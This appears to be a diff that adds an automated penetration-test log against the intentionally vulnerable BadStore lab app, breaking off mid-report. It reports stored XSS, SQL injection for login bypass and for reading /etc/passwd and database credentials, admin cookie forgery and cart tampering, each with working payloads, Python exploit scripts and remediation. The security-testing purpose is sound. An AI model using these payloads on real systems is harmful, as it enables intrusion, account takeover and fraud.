@@ -1,0 +1,972 @@
+>>> badstore — run 2/2
+
+>>> Cleaning /tmp...
+/tmp already clean
+
+>>> Restarting targets-badstore...
+
+>>> Waiting for http://badstore:80...
+
+>>> Target ready.
+
+>>> Running Strix...
+
+╭─ STRIX ──────────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Penetration test initiated                                                  │
+│                                                                              │
+│  Target  http://badstore:80                                                  │
+│  Output  strix_runs/badstore-80_aad3                                         │
+│                                                                              │
+│  Vulnerabilities will be displayed in real-time.                             │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ VULN-0001 ──────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: Stored Cross-Site Scripting (XSS) in Guestbook Comments              │
+│                                                                              │
+│  Severity: CRITICAL                                                          │
+│                                                                              │
+│  CVSS Score: 9.6                                                             │
+│                                                                              │
+│  Target: http://badstore:80                                                  │
+│                                                                              │
+│  Endpoint: /cgi-bin/badstore.cgi?action=doguestbook                          │
+│                                                                              │
+│  Method: POST                                                                │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L                            │
+│                                                                              │
+│  Description                                                                 │
+│  A stored cross-site scripting (XSS) vulnerability was identified in the     │
+│  guestbook feature. User-supplied input submitted to the guestbook is        │
+│  stored server-side and later rendered back into the guestbook page without  │
+│  output encoding or sanitization, allowing attacker-controlled               │
+│  HTML/JavaScript to execute in the browser of any user who views the         │
+│  guestbook.                                                                  │
+│                                                                              │
+│  Impact                                                                      │
+│  An unauthenticated attacker can inject script that executes for all         │
+│  visitors who view the guestbook page. This can be used to steal session     │
+│  cookies (if accessible), exfiltrate sensitive data displayed in the         │
+│  application, perform authenticated actions on behalf of victims (CSRF-like  │
+│  behavior within the same origin), and pivot into further account            │
+│  compromise. The stored nature increases risk because exploitation does not  │
+│  require victim interaction beyond viewing the affected guestbook page.      │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The guestbook submission handler accepts arbitrary text for the “comments”  │
+│  field and persists it. When the guestbook entries are displayed, the        │
+│  stored content is inserted directly into the HTML response inside the       │
+│  guestbook entry markup (for example, within the <OL><I>…</I></OL> block)    │
+│  without HTML entity encoding. As a result, an attacker can inject active    │
+│  HTML such as an SVG element with an onload handler, which will execute      │
+│  when the page is rendered. Proxy response evidence shows the injected SVG   │
+│  element persisted in the guestbook HTML, confirming server-side storage     │
+│  and unsafe rendering.                                                       │
+│                                                                              │
+│  PoC Description                                                             │
+│  1. Submit a guestbook entry:                                                │
+│     Send a POST request to /cgi-bin/badstore.cgi?action=doguestbook with     │
+│  form-encoded parameters name, email, and comments. Use the following        │
+│  comments payload (URL-encode as needed):                                    │
+│     --><svg id="gbxssval20260213"                                            │
+│  onload="window.gbxssval20260213=1;document.title='XSS_VALIDATED'"></svg><!  │
+│  --                                                                          │
+│                                                                              │
+│  2. Trigger the stored payload:                                              │
+│     Visit /cgi-bin/badstore.cgi?action=doguestbook in a browser.             │
+│                                                                              │
+│  3. Observe execution:                                                       │
+│     The page title changes to XSS_VALIDATED (and window.gbxssval20260213     │
+│  becomes 1), demonstrating arbitrary JavaScript execution from stored        │
+│  content.                                                                    │
+│                                                                              │
+│  PoC Code                                                                    │
+│  import sys                                                                  │
+│  import time                                                                 │
+│  import requests                                                             │
+│                                                                              │
+│  BASE = "http://badstore"                                                    │
+│  SUBMIT_URL = f"{BASE}/cgi-bin/badstore.cgi?action=doguestbook"              │
+│  VIEW_URL = f"{BASE}/cgi-bin/badstore.cgi?action=doguestbook"                │
+│                                                                              │
+│  PAYLOAD = """--><svg id="gbxssval20260213"                                  │
+│  onload="window.gbxssval20260213=1;document.title='XSS_VALIDATED'"></svg><!  │
+│  --"""                                                                       │
+│                                                                              │
+│  def main() -> int:                                                          │
+│      name = f"reporting-{int(time.time())}"                                  │
+│      email = "reporting@example.com"                                         │
+│                                                                              │
+│      data = {                                                                │
+│          "name": name,                                                       │
+│          "email": email,                                                     │
+│          "comments": PAYLOAD,                                                │
+│      }                                                                       │
+│                                                                              │
+│      r = requests.post(SUBMIT_URL, data=data, timeout=15)                    │
+│      print(f"[+] Submit status: {r.status_code}")                            │
+│                                                                              │
+│      r2 = requests.get(VIEW_URL, timeout=15)                                 │
+│      print(f"[+] View status: {r2.status_code}")                             │
+│                                                                              │
+│      body = r2.text                                                          │
+│      if "gbxssval20260213" in body:                                          │
+│          print("[+] Stored payload marker found in guestbook HTML (stored    │
+│  XSS confirmed).")                                                           │
+│          i = body.find("gbxssval20260213")                                   │
+│          print("[+] Context snippet:")                                       │
+│          print(body[max(0, i - 120): i + 200])                               │
+│          print()                                                             │
+│          print("[!] To demonstrate execution, open the guestbook page in a   │
+│  browser and observe document.title changes to 'XSS_VALIDATED'.")            │
+│          return 0                                                            │
+│                                                                              │
+│      print("[-] Marker not found; payload may not have been stored or page   │
+│  content changed.")                                                          │
+│      return 1                                                                │
+│                                                                              │
+│  if __name__ == \"__main__\":                                                │
+│      raise SystemExit(main())                                                │
+│                                                                              │
+│  Remediation                                                                 │
+│  Apply robust output encoding and input handling for all guestbook fields:   │
+│  - Encode guestbook entries on output using context-appropriate HTML entity  │
+│  encoding (at minimum: <, >, &, quotes).                                     │
+│  - Prefer storing raw text and rendering it as text (not HTML). If           │
+│  formatting is required, use a strict allowlist-based sanitizer and remove   │
+│  all event handlers and script-capable constructs.                           │
+│  - Implement a defense-in-depth Content Security Policy (CSP) that           │
+│  restricts script execution (for example, disallow inline scripts and event  │
+│  handlers where feasible).                                                   │
+│  - Add automated security tests to ensure guestbook entries cannot inject    │
+│  HTML/JS.                                                                    │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ VULN-0002 ──────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: SQL Injection in Login Endpoint Enables Authentication Bypass        │
+│                                                                              │
+│  Severity: CRITICAL                                                          │
+│                                                                              │
+│  CVSS Score: 9.4                                                             │
+│                                                                              │
+│  Target: http://badstore:80                                                  │
+│                                                                              │
+│  Endpoint: /cgi-bin/badstore.cgi?action=login                                │
+│                                                                              │
+│  Method: POST                                                                │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L                            │
+│                                                                              │
+│  Description                                                                 │
+│  A SQL injection vulnerability was identified in the login workflow. The     │
+│  application’s login handler accepts user-controlled input in the “email”    │
+│  parameter and uses it in a database query without safe                      │
+│  parameterization.\n\nBy injecting a tautology into the email field, an      │
+│  attacker can bypass authentication and obtain a valid authenticated         │
+│  session, gaining access to protected functionality as another user.         │
+│                                                                              │
+│  Impact                                                                      │
+│  An unauthenticated attacker can bypass login controls and establish an      │
+│  authenticated session without valid credentials.\n\nThis enables            │
+│  unauthorized access to account functionality and any data/actions           │
+│  available to the impersonated user. Depending on the role resolved by the   │
+│  injected query, this can lead to exposure of sensitive customer data and    │
+│  unauthorized account changes.                                               │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The login endpoint processes a form POST containing “email” and “passwd”.   │
+│  The “email” parameter is injectable.\n\nA reliable boolean-based oracle     │
+│  was demonstrated:\n\nA) Truthy predicate (authentication                    │
+│  bypass)\nSupplying a tautology in the email field results in an             │
+│  authenticated session cookie being issued.\n\nExample payload               │
+│  (URL-decoded):\nemail=' OR '1'='1' -- \n\nThe application responds with a   │
+│  Set-Cookie header for SSOid. Decoding the cookie value (URL-decode then     │
+│  Base64-decode) reveals session contents that include the injected           │
+│  predicate and an authenticated identity/role, for example:\n' OR '1'='1'    │
+│  -- :6f1ed002ab5595859014ebf0951522d9:Test User:U\n\nUsing the returned      │
+│  SSOid cookie to request the account page confirms authentication (the page  │
+│  renders “Welcome, Test User”).\n\nB) Falsy predicate (no                    │
+│  authentication)\nUsing a false predicate results in a cookie that does not  │
+│  include an authenticated user, for example:\n' OR '1'='2' --                │
+│  :6f1ed002ab5595859014ebf0951522d9::\n\nAdditionally, malformed UNION        │
+│  payloads trigger a database error indicating the backend is MySQL           │
+│  (DBD::mysql), confirming server-side SQL execution of the user-controlled   │
+│  input.                                                                      │
+│                                                                              │
+│  PoC Description                                                             │
+│  To reproduce:\n\n1) Send a login request with a tautology in the email      │
+│  field:\nPOST /cgi-bin/badstore.cgi?action=login\nContent-Type:              │
+│  application/x-www-form-urlencoded\n\ne-mail payload:\nemail=' OR '1'='1'    │
+│  -- \npasswd=blah\n\n2) Observe that the response issues a Set-Cookie        │
+│  header for SSOid.\n\n3) Reuse the SSOid cookie in a new request:\nGET       │
+│  /cgi-bin/badstore.cgi?action=myaccount\nCookie: SSOid=<value from step      │
+│  2>\n\n4) Observe the application renders an authenticated page (e.g.,       │
+│  “Welcome, Test User”).\n\n5) Optional negative control:\nRepeat step 1      │
+│  with email=' OR '1'='2' -- and verify the authenticated identity is not     │
+│  granted.                                                                    │
+│                                                                              │
+│  PoC Code                                                                    │
+│  import base64\nimport re\nimport urllib.parse\n\nimport requests\n\nBASE =  │
+│  \"http://badstore\"\nLOGIN =                                                │
+│  f\"{BASE}/cgi-bin/badstore.cgi?action=login\"\nMYACCOUNT =                  │
+│  f\"{BASE}/cgi-bin/badstore.cgi?action=myaccount\"\n\n\ndef                  │
+│  extract_cookie_value(set_cookie_header: str, name: str = \"SSOid\") ->      │
+│  str:\n    m = re.search(rf\"{re.escape(name)}=([^;]+)\", set_cookie_header  │
+│  or \"\")\n    if not m:\n        raise RuntimeError(f\"Set-Cookie header    │
+│  did not contain {name}\")\n    return m.group(1)\n\n\ndef                   │
+│  decode_ssoid(val: str) -> str:\n    raw =                                   │
+│  urllib.parse.unquote(val).strip()\n    return                               │
+│  base64.b64decode(raw).decode(errors=\"replace\")\n\n\ndef                   │
+│  attempt_login(email_payload: str) -> tuple[str, str]:\n    data =           │
+│  {\"email\": email_payload, \"passwd\": \"blah\"}\n    r =                   │
+│  requests.post(LOGIN, data=data, timeout=15, allow_redirects=False)\n\n      │
+│  set_cookie = r.headers.get(\"Set-Cookie\", \"\")\n    ssoid =               │
+│  extract_cookie_value(set_cookie)\n    decoded = decode_ssoid(ssoid)\n       │
+│  return ssoid, decoded\n\n\ndef access_myaccount(ssoid: str) -> str:\n    s  │
+│  = requests.Session()\n    s.cookies.set(\"SSOid\", ssoid)\n    r =          │
+│  s.get(MYACCOUNT, timeout=15)\n    return r.text\n\n\ndef main() -> int:\n   │
+│  true_payload = \"' OR '1'='1' -- \"\n    false_payload = \"' OR '1'='2' --  │
+│  \"\n\n    print(\"[+] Attempting SQLi auth bypass (true predicate)...\")\n  │
+│  ssoid_true, decoded_true = attempt_login(true_payload)\n    print(\"[+]     │
+│  Decoded SSOid (true):\")\n    print(decoded_true)\n\n    page =             │
+│  access_myaccount(ssoid_true)\n    if \"Welcome, Test User\" in page or      │
+│  \"Test User\" in page:\n        print(\"[+] Authenticated access            │
+│  confirmed: myaccount page indicates logged-in user.\")\n    else:\n         │
+│  print(\"[-] Did not observe expected authenticated marker; review response  │
+│  manually.\")\n\n    print(\"\\n[+] Negative control (false                  │
+│  predicate)...\")\n    _, decoded_false = attempt_login(false_payload)\n     │
+│  print(\"[+] Decoded SSOid (false):\")\n    print(decoded_false)\n\n         │
+│  return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())    │
+│                                                                              │
+│  Remediation                                                                 │
+│  Implement robust SQL injection defenses in the login handler:\n\n1) Use     │
+│  parameterized queries/prepared statements for all database access; do not   │
+│  concatenate the “email” value into SQL.\n\n2) Enforce strict server-side    │
+│  input validation on the email field (format validation and length limits)   │
+│  as defense-in-depth.\n\n3) Ensure authentication logic does not accept      │
+│  user-controlled predicates; use constant-time comparisons for password      │
+│  verification.\n\n4) Reduce error leakage: return generic error pages and    │
+│  log detailed database errors server-side only.\n\n5) Add automated          │
+│  security tests for boolean-based and error-based injection patterns on      │
+│  authentication endpoints.                                                   │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ VULN-0003 ──────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: SQL Injection in Search Parameter Enables Database Extraction and    │
+│  Arbitrary File Read                                                         │
+│                                                                              │
+│  Severity: CRITICAL                                                          │
+│                                                                              │
+│  CVSS Score: 10.0                                                            │
+│                                                                              │
+│  Target: http://badstore:80                                                  │
+│                                                                              │
+│  Endpoint: /cgi-bin/badstore.cgi?action=search                               │
+│                                                                              │
+│  Method: GET                                                                 │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L                            │
+│                                                                              │
+│  Description                                                                 │
+│  A SQL injection vulnerability was identified in the product search          │
+│  feature. The application concatenates the user-controlled `searchquery`     │
+│  parameter directly into a SQL statement executed by the backend database    │
+│  driver (MariaDB), resulting in attacker-controlled SQL execution.\n\nThe    │
+│  issue is exploitable via error-based injection (single quote triggers a     │
+│  database syntax error) and UNION-based injection (attacker-supplied SELECT  │
+│  results are rendered into the HTML response). This enables extraction of    │
+│  sensitive database metadata and supports arbitrary file reads via           │
+│  MariaDB's `LOAD_FILE()` when the database user has FILE privileges.\n\nIn   │
+│  addition to database data exposure, exploitation was demonstrated to        │
+│  disclose server files (e.g., `/etc/passwd`) and the application source      │
+│  code, which contained hardcoded database credentials.                       │
+│                                                                              │
+│  Impact                                                                      │
+│  Successful exploitation allows an unauthenticated remote attacker to        │
+│  execute arbitrary SQL queries against the backend database. Practical       │
+│  impact demonstrated includes:\n\nDisclosure of database identity and user   │
+│  context (database name, DB username, exact DB version)\nArbitrary file      │
+│  read from the server via `LOAD_FILE()` (e.g., `/etc/passwd`)\nDisclosure    │
+│  of application source code, including database connection credentials       │
+│  (`root` / `secret`), which materially increases the likelihood of full      │
+│  database compromise and lateral movement\n\nDepending on database           │
+│  permissions, this class of vulnerability can also enable modification or    │
+│  destruction of data (e.g., altering users/orders, dropping tables) and      │
+│  denial of service.                                                          │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The vulnerable endpoint is:\n\nGET                                          │
+│  `/cgi-bin/badstore.cgi?action=search&searchquery=...`\n\nA single quote in  │
+│  `searchquery` triggers a database syntax error that is returned to the      │
+│  client, confirming unsafe string concatenation and leaking backend          │
+│  implementation details:\n\n`DBD::mysql::st execute failed: You have an      │
+│  error in your SQL syntax ... at ... badstore.cgi line 242.`\n\nUNION-based  │
+│  injection is possible with a 4-column SELECT, and injected values are       │
+│  reflected into the returned HTML table. Example:\n\n`' UNION SELECT         │
+│  1,database(),user(),@@version#`\n\nThis returned the database name          │
+│  (`badstoredb`), database user context (`root@localhost`), and precise       │
+│  MariaDB version (`11.8.3-MariaDB-0+deb13u1 from Debian`).\n\nHigh-impact    │
+│  escalation was demonstrated via `LOAD_FILE()`, which returned the contents  │
+│  of `/etc/passwd` in the response, proving arbitrary server-side file read   │
+│  via SQL injection. Further, the application source code was disclosed by    │
+│  reading `/data/apache2/cgi-bin/badstore.cgi`, which contained the database  │
+│  connection string and credentials.\n\nRoot cause: user input is             │
+│  incorporated into SQL without parameterization and without output/error     │
+│  handling controls, and the database account used by the application is      │
+│  highly privileged.                                                          │
+│                                                                              │
+│  PoC Description                                                             │
+│  1. Confirm error-based SQL injection\nSend a request that injects a single  │
+│  quote:\n`GET /cgi-bin/badstore.cgi?action=search&searchquery=%27`\nObserve  │
+│  HTTP 500 with a MariaDB syntax error referencing the query context.\n\n2.   │
+│  Confirm UNION-based injection and extract DB metadata\nSend:\n`GET          │
+│  /cgi-bin/badstore.cgi?action=search&searchquery=%27%20UNION%20SELECT%201,d  │
+│  atabase(),user(),@@version%23`\nObserve the returned search results table   │
+│  contains `badstoredb`, `root@localhost`, and the MariaDB version.\n\n3.     │
+│  Demonstrate arbitrary file read via SQL injection\nSend:\n`GET              │
+│  /cgi-bin/badstore.cgi?action=search&searchquery=%27%20UNION%20ALL%20SELECT  │
+│  %201,LOAD_FILE(0x2f6574632f706173737764),3,4%23`\nObserve `/etc/passwd`     │
+│  contents are returned inside the HTML table.\n\n4. Demonstrate application  │
+│  source disclosure and credential exposure\nSend:\n`GET                      │
+│  /cgi-bin/badstore.cgi?action=search&searchquery=%27%20UNION%20ALL%20SELECT  │
+│  %201,SUBSTRING(LOAD_FILE(0x2f646174612f617061636865322f6367692d62696e2f626  │
+│  16473746f72652e636769),LOCATE(0x4442492d3e636f6e6e656374,LOAD_FILE(0x2f646  │
+│  174612f617061636865322f6367692d62696e2f62616473746f72652e636769)),600),3,4  │
+│  %23`\nObserve the response includes a `DBI->connect(...)` line showing the  │
+│  database username `root` and password `secret`.                             │
+│                                                                              │
+│  PoC Code                                                                    │
+│  import re\nimport sys\nfrom urllib.parse import quote\n\nimport             │
+│  requests\n\nBASE = \"http://badstore\"\nENDPOINT =                          │
+│  \"/cgi-bin/badstore.cgi\"\n\n\ndef fetch(searchquery: str) ->               │
+│  requests.Response:\n    s = requests.Session()\n    s.trust_env = False\n   │
+│  url = f\"{BASE}{ENDPOINT}?action=search&searchquery={quote(searchquery,     │
+│  safe='') }\"\n    return s.get(url, timeout=20)\n\n\ndef                    │
+│  first_row_tds(html: str):\n    # Extract the first table row returned by    │
+│  the search page\n    m =                                                    │
+│  re.search(r\"<tr><td>(.*?)</td>\\s*<td>(.*?)</td>\\s*<td>(.*?)</td>\\s*<td  │
+│  >(.*?)</td>\", html, re.I | re.S)\n    if not m:\n        return None\n     │
+│  return [re.sub(r\"<.*?>\", \"\", x).strip() for x in m.groups()]\n\n\ndef   │
+│  main() -> int:\n    # 1) Error-based confirmation\n    r = fetch(\"'\")\n   │
+│  print(\"[1] Error-based probe status:\", r.status_code)\n                   │
+│  print(r.text[:250].replace(\"\\n\", \" \"))\n    print()\n\n    # 2)        │
+│  UNION-based metadata extraction\n    payload = \"' UNION SELECT             │
+│  1,database(),user(),@@version#\"\n    r = fetch(payload)\n    row =         │
+│  first_row_tds(r.text)\n    print(\"[2] UNION metadata status:\",            │
+│  r.status_code)\n    print(\"Extracted row:\", row)\n    print()\n\n    #    │
+│  3) Arbitrary file read via LOAD_FILE(/etc/passwd)\n    payload = \"' UNION  │
+│  ALL SELECT 1,LOAD_FILE(0x2f6574632f706173737764),3,4#\"\n    r =            │
+│  fetch(payload)\n    row = first_row_tds(r.text)\n    print(\"[3]            │
+│  LOAD_FILE(/etc/passwd) status:\", r.status_code)\n    if row:\n             │
+│  print(\"First 200 chars of /etc/passwd from response:\")\n                  │
+│  print(row[1][:200])\n    else:\n        print(\"Could not parse table       │
+│  row\")\n    print()\n\n    # 4) Source disclosure + credential exposure     │
+│  (snippet around DBI->connect)\n    code_path_hex =                          │
+│  \"0x2f646174612f617061636865322f6367692d62696e2f62616473746f72652e636769\"  │
+│  \n    needle_hex = \"0x4442492d3e636f6e6e656374\"  # \"DBI->connect\"\n     │
+│  payload = (\n        \"' UNION ALL SELECT 1,\"\n                            │
+│  f\"SUBSTRING(LOAD_FILE({code_path_hex}),LOCATE({needle_hex},LOAD_FILE({cod  │
+│  e_path_hex})),600),\"\n        \"3,4#\"\n    )\n    r = fetch(payload)\n    │
+│  row = first_row_tds(r.text)\n    print(\"[4] Source snippet status:\",      │
+│  r.status_code)\n    if row:\n        print(\"Snippet:\")\n                  │
+│  print(row[1])\n    else:\n        print(\"Could not parse table row\")\n\n  │
+│  return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())    │
+│                                                                              │
+│  Remediation                                                                 │
+│  Implement layered SQL injection defenses:\n\nUse parameterized queries      │
+│  (prepared statements) for all SQL operations. Do not concatenate user       │
+│  input into SQL strings.\nApply strict server-side input validation          │
+│  appropriate to the expected search format.\nRemove verbose database error   │
+│  messages from HTTP responses; log errors server-side instead.\nUse a        │
+│  dedicated, least-privilege database user for the application. Avoid using   │
+│  `root` for application connections.\nDisable or restrict file read          │
+│  capabilities at the database layer (remove FILE privilege from the          │
+│  application account; ensure `secure_file_priv` is appropriately             │
+│  configured).\nAdd automated security tests (unit/integration) covering      │
+│  injection payloads for all input points.                                    │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ VULN-0004 ──────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: SSOid Session Cookie Forgery Enables Unauthenticated Admin           │
+│  Impersonation                                                               │
+│                                                                              │
+│  Severity: CRITICAL                                                          │
+│                                                                              │
+│  CVSS Score: 9.1                                                             │
+│                                                                              │
+│  Target: http://badstore:80                                                  │
+│                                                                              │
+│  Endpoint: /cgi-bin/badstore.cgi?action=myaccount,                           │
+│  /cgi-bin/badstore.cgi?action=adminportal                                    │
+│                                                                              │
+│  Method: GET, POST                                                           │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N                            │
+│                                                                              │
+│  Description                                                                 │
+│  The application’s session mechanism relies on a client-supplied cookie      │
+│  named SSOid. The server accepts this value as authoritative identity and    │
+│  authorization data, but it is only Base64-encoded user-controlled data and  │
+│  lacks integrity protection (no MAC/signature, no server-side session        │
+│  lookup).\n\nBy forging an SSOid value containing an arbitrary email, full   │
+│  name, and privileged role (e.g., role “A”), an unauthenticated attacker     │
+│  can impersonate an administrative user and access admin-only                │
+│  functionality.                                                              │
+│                                                                              │
+│  Impact                                                                      │
+│  An unauthenticated attacker can:\n\n- Bypass authentication and             │
+│  impersonate arbitrary users.\n- Escalate privileges to administrative role  │
+│  (“A”).\n- Access sensitive administrative functionality and data exposed    │
+│  through the admin portal (e.g., administrative workflows and system         │
+│  information pages).\n\nThis enables complete compromise of confidentiality  │
+│  and integrity for application data accessible to admins, and may enable     │
+│  additional chained attacks (e.g., password resets, user management, data    │
+│  export/backup features).                                                    │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The SSOid cookie is accepted by the server as a serialized authentication   │
+│  token.\n\nObserved format:\n- URL-safe Base64 of a colon-delimited string:  │
+│  email:md5:fullname:role\n\nExample forged cookie:\n- SSOid (Base64):        │
+│  YXR0YWNrZXJAZXhhbXBsZS5jb206MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA6QW  │
+│  RtaW4gVXNlcjpB\n- Decodes to:                                               │
+│  attacker@example.com:00000000000000000000000000000000:Admin User:A\n\nThe   │
+│  application trusts the decoded “role” field for authorization decisions     │
+│  (e.g., “A” treated as admin). Because there is no cryptographic             │
+│  signature/MAC and no server-side session binding, an attacker can mint      │
+│  arbitrary identities and roles by crafting a new Base64 value and placing   │
+│  it in the SSOid cookie.                                                     │
+│                                                                              │
+│  PoC Description                                                             │
+│  1. Create a forged SSOid value by Base64-encoding the string                │
+│  “attacker@example.com:00000000000000000000000000000000:Admin User:A”.\n2.   │
+│  Send a request to the authenticated-only page using the forged cookie:\n    │
+│  - GET /cgi-bin/badstore.cgi?action=myaccount\n   - Observe the response     │
+│  renders “Welcome, Admin User” and includes role “A”.\n3. Access an          │
+│  admin-only function using only the forged cookie:\n   - POST                │
+│  /cgi-bin/badstore.cgi?action=adminportal with body admin=Troubleshooting\n  │
+│  - Observe admin portal content is returned (e.g., “Secret Administration    │
+│  Portal” and “CGI Environment Variables”).\n4. Control check:\n   - Repeat   │
+│  step 3 without the SSOid cookie and observe the application returns “Error  │
+│  - {Unregistered User} is not an Admin!”.                                    │
+│                                                                              │
+│  PoC Code                                                                    │
+│  import base64\nimport re\nimport urllib.parse\n\nimport requests\n\nBASE =  │
+│  \"http://badstore\"\n\n\ndef forge_ssoid(email: str, md5hex: str,           │
+│  fullname: str, role: str) -> str:\n    raw =                                │
+│  f\"{email}:{md5hex}:{fullname}:{role}\".encode()\n    return                │
+│  base64.b64encode(raw).decode()\n\n\ndef main() -> int:\n    s =             │
+│  requests.Session()\n    s.trust_env = False\n\n    forged_b64 =             │
+│  forge_ssoid(\n        email=\"attacker@example.com\",\n                     │
+│  md5hex=\"0\" * 32,\n        fullname=\"Admin User\",\n                      │
+│  role=\"A\",\n    )\n\n    cookie_header = {\"Cookie\":                      │
+│  f\"SSOid={urllib.parse.quote(forged_b64)}\", \"Accept-Encoding\":           │
+│  \"identity\"}\n\n    r1 =                                                   │
+│  s.get(f\"{BASE}/cgi-bin/badstore.cgi?action=myaccount\",                    │
+│  headers=cookie_header, timeout=20)\n    ok_myaccount = (r1.status_code ==   │
+│  200) and (\"Welcome,  Admin User\" in r1.text or \"Welcome, Admin User\"    │
+│  in r1.text)\n\n    r2 = s.post(\n                                           │
+│  f\"{BASE}/cgi-bin/badstore.cgi?action=adminportal\",\n                      │
+│  headers={**cookie_header, \"Content-Type\":                                 │
+│  \"application/x-www-form-urlencoded\"},\n                                   │
+│  data=\"admin=Troubleshooting&Do+It=Do+It\",\n        timeout=30,\n    )\n   │
+│  ok_admin = (\n        r2.status_code == 200\n        and \"Secret           │
+│  Administration Portal\" in r2.text\n        and \"CGI Environment           │
+│  Variables\" in r2.text\n        and \"not an Admin\" not in r2.text\n       │
+│  )\n\n    # Control: same request without cookie should be denied\n    r3 =  │
+│  s.post(\n        f\"{BASE}/cgi-bin/badstore.cgi?action=adminportal\",\n     │
+│  headers={\"Accept-Encoding\": \"identity\", \"Content-Type\":               │
+│  \"application/x-www-form-urlencoded\"},\n                                   │
+│  data=\"admin=Troubleshooting&Do+It=Do+It\",\n        timeout=30,\n    )\n   │
+│  denied_control = (r3.status_code == 200) and (\"not an Admin\" in           │
+│  r3.text)\n\n    print(\"Forged SSOid (base64):\", forged_b64)\n             │
+│  print(\"MyAccount access success:\", ok_myaccount)\n                        │
+│  print(\"AdminPortal access success:\", ok_admin)\n    print(\"Control       │
+│  request denied:\", denied_control)\n\n    # Minimal evidence snippets\n     │
+│  if ok_myaccount:\n        m = re.search(r\"<h2>([^<]+)</h2>\", r1.text,     │
+│  re.IGNORECASE)\n        print(\"MyAccount h2:\", m.group(1).strip() if m    │
+│  else \"(not found)\")\n\n    if ok_admin:\n        t =                      │
+│  re.search(r\"<title>([^<]+)</title>\", r2.text, re.IGNORECASE)\n            │
+│  print(\"AdminPortal title:\", t.group(1).strip() if t else \"(not           │
+│  found)\")\n\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise      │
+│  SystemExit(main())\n                                                        │
+│                                                                              │
+│  Remediation                                                                 │
+│  Implement a secure server-side session design:\n\n- Do not store            │
+│  authorization decisions (e.g., role) in client-controlled data unless it    │
+│  is cryptographically integrity-protected.\n- Replace the current cookie     │
+│  format with a random, unguessable session identifier stored server-side     │
+│  (recommended), or use a signed token (HMAC) with strict key management and  │
+│  rotation.\n- Bind session state to server-side records and re-derive        │
+│  authorization from the database on each request (deny-by-default).\n- Add   │
+│  secure cookie attributes (HttpOnly, Secure when using HTTPS, SameSite) and  │
+│  ensure logout invalidates sessions server-side.\n- Add monitoring for       │
+│  anomalous session creation and role changes.                                │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ VULN-0005 ──────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: Cart Total Tampering via Client-Controlled CartID Cookie Enables     │
+│  Underpayment for Expensive Items                                            │
+│                                                                              │
+│  Severity: HIGH                                                              │
+│                                                                              │
+│  CVSS Score: 7.5                                                             │
+│                                                                              │
+│  Target: http://badstore                                                     │
+│                                                                              │
+│  Endpoint: /cgi-bin/badstore.cgi?action=cartview,                            │
+│  /cgi-bin/badstore.cgi?action=submitpayment,                                 │
+│  /cgi-bin/badstore.cgi?action=order                                          │
+│                                                                              │
+│  Method: GET, POST                                                           │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N                            │
+│                                                                              │
+│  Description                                                                 │
+│  A business logic vulnerability was identified in the shopping cart          │
+│  workflow where the application trusts pricing totals embedded in the        │
+│  client-side CartID cookie. By forging the CartID cookie’s total field, an   │
+│  unauthenticated attacker can place orders for high-priced items while       │
+│  paying an arbitrary lower amount.\n\nThis issue is demonstrated using item  │
+│  1005 (“Perfect Code”), which is displayed with a price of 5000 in the cart  │
+│  and order confirmation pages, while the purchase total is accepted and      │
+│  recorded as $11.50 based solely on the tampered CartID cookie.              │
+│                                                                              │
+│  Impact                                                                      │
+│  An attacker can underpay for goods by manipulating the cart total,          │
+│  resulting in direct financial loss and potential inventory/fulfillment      │
+│  abuse. This weakness can be automated to repeatedly place orders with       │
+│  attacker-controlled totals, bypassing intended pricing and checkout         │
+│  controls.                                                                   │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The application maintains cart state in a client-controlled cookie named    │
+│  CartID. The cookie value follows a colon-delimited structure that includes  │
+│  the item count and cart total. The server renders and processes the cart    │
+│  using these client-provided values rather than recomputing totals from      │
+│  authoritative product pricing.\n\nWhen CartID is set to a forged value      │
+│  indicating one item with a low total (e.g., “...:1:11.5:1005”), the cart    │
+│  page displays “Cart Contains: 1 items at $11.50” while also displaying the  │
+│  item’s price cell as 5000. The checkout flow continues to accept $11.50 as  │
+│  the purchase price and returns an order confirmation stating “Purchased: 1  │
+│  items at $11.50” even though the ordered item remains listed with price     │
+│  5000.\n\nThis indicates the total used for charging/recording is derived    │
+│  from the cookie rather than server-side calculation.                        │
+│                                                                              │
+│  PoC Description                                                             │
+│  To reproduce:\n\n1) Set the following cookie in the browser (no             │
+│  authentication required):\n   CartID=1770996934%3A1%3A11.5%3A1005\n\n2)     │
+│  Request the cart page:\n   GET /cgi-bin/badstore.cgi?action=cartview\n      │
+│  Observe both of the following in the response:\n   - “Cart Contains: 1      │
